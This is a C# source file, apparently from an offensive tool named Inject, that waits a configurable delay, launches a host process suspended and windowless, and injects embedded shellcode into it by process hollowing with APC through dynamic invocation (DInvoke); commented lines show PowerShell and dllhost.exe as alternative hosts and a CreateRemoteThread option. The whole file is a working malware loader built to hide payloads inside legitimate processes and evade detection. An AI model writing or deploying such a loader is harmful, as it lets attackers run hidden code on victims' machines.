using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Wrapper;

namespace Inject
{
    public class Entry
    {

        public static void Start()
        {
#if DEBUG
            Console.WriteLine("Running Inject.");
#endif

            //var apitype = APIAccessType.PInvoke;
            //var injectMethod = InjectionMethod.CreateRemoteThread;

            var apitype = APIAccessType.DInvoke;
            var injectMethod = InjectionMethod.ProcessHollowingWithAPC;
            //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} RunningInjector{Environment.NewLine}");

            try
            {
                var app = Properties.Resources.Host;
                //app = @"c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe";
                //app = @"c:\windows\system32\dllhost.exe";

                Thread.Sleep(1000);
#if DEBUG
                Console.WriteLine("Creating Process !");
                Console.WriteLine(app);
                Console.WriteLine("version 3.0");

                //File.AppendAllText(@"c:\users\public\log.txt",$"{DateTime.Now} RunningInjector{Environment.NewLine}");
#endif

                //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} Creating Process !{Environment.NewLine}");
                //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} {app}{Environment.NewLine}");
                //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} version 2.3{Environment.NewLine}");

                int delay = 60;
                int.TryParse(Properties.Resources.Delay, out delay);

                Thread.Sleep(delay * 1000);

                var wrapper = PInvokeAPIWrapper.CreateInstance(apitype);

                var creationParms = new ProcessCreationParameters()
                {
                    Application = app,
                    CreateNoWindow = true,
                    CreateSuspended = true,
                };

#if DEBUG
                Console.WriteLine($"[>] Executing {app}...");
#endif
                var procResult = wrapper.CreateProcess(creationParms);

#if DEBUG
                Console.WriteLine($"[?] ProcessId = {procResult.ProcessId}");
                Console.WriteLine($"[?] ProcessHandle = {procResult.ProcessHandle}");
                Console.WriteLine($"[?] PipeHandle = {procResult.OutPipeHandle}");
#endif

                byte[] shellcode = Properties.Resources.Payload;

                wrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode, injectMethod);
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine(e.ToString());
#endif
                //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} : Error => {e.ToString()}{Environment.NewLine}");
            }
            finally
            {
                //Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
            }


            Thread.Sleep(1000);

#if DEBUG
            Console.WriteLine("End Injects !");
            Console.WriteLine("Plz key!");
            Console.ReadKey();
#endif
        }
    }
}
